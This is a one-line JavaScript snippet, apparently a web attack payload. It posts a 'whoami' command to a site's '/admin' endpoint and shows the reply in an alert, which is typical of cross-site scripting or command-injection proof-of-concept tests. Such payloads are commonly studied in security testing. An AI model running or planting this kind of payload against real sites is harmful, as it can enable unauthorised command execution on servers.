fetch('/admin', {method: 'POST', body: JSON.stringify({cmd: 'whoami'})}).then(res => res.text()).then(alert);
